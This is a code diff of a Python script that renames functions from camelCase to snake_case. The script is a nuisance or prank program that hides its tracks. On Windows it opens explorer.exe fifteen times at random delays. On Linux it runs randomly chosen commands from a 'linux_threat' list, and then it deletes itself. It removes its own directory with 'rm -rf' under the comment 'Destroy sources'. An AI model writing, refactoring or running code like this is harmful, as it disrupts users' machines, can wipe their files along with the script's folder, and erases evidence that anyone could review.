@@ -22,7 +22,7 @@ from time       import sleep
 MAX_LATENCY = 2*60 
 
 
-def getWindowsPath():
+def get_windows_path():
     """Check and correct the windows path
     Return string
     """
@@ -39,12 +39,12 @@ def getWindowsPath():
         index += 1
     return "\\".join(spath)
 
-def selfDestruction():
+def self_destruction():
     """self destroy the file regarding current OS then quit
     """
     if cOS == 'nt':
         selfDestruct = "del " \
-                     + getWindowsPath()
+                     + get_windows_path()
         system(selfDestruct)
     else:
         call(["rm","-rf", p.dirname(p.abspath(__file__))])
@@ -57,7 +57,7 @@ if __name__ == "__main__":
         for i in range(15):
             sleep(randint(0,MAX_LATENCY))
             system("start %windir%\explorer.exe")
-        selfDestruction()
+        self_destruction()
         
     # Linux
     else:
@@ -75,4 +75,4 @@ if __name__ == "__main__":
                     sleep(randint(0,MAX_LATENCY))
                     call(choice(linux_threat))
         else:
-            selfDestruction() # Destroy sources
+            self_destruction() # Destroy sources
